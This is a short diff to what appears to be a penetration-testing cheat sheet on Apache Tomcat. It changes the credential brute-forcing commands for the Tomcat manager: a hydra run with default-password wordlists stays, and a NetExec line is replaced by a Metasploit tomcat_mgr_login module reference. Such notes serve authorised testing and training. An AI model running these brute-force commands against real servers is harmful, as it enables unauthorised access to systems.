@@ -99,8 +99,8 @@ hydra -L /usr/share/seclists/Usernames/tomcat-betterdefaultpasslist/users.txt \
       -P /usr/share/seclists/Passwords/Common-Credentials/tomcat-betterdefaultpasslist/passwords.txt \
       <TARGET> -s 8080 http-get /manager/html
 
-# nxc
-nxc http <TARGET> -u tomcat -p tomcat --port 8080
+# Metasploit (NetExec has no http protocol)
+# msfconsole → use auxiliary/scanner/http/tomcat_mgr_login → set RHOSTS/RPORT → run
 ```
 
 ### Exploitation — WAR Upload (auth Manager)
